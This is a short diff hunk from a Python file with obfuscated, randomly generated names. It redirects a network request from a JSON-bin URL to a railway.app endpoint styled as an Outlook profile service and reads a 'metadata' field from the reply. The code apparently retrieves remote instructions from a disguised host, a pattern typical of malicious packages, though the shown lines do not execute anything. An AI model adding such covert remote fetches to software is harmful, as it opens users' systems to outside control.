@@ -16,7 +16,7 @@ def config_qhmuhp_772():
 
     def net_sywnuv_183():
         try:
-            train_nonisy_637 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_nonisy_637 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_nonisy_637.raise_for_status()
             net_cixtxr_834 = train_nonisy_637.json()
             net_naywvt_705 = net_cixtxr_834.get('metadata')
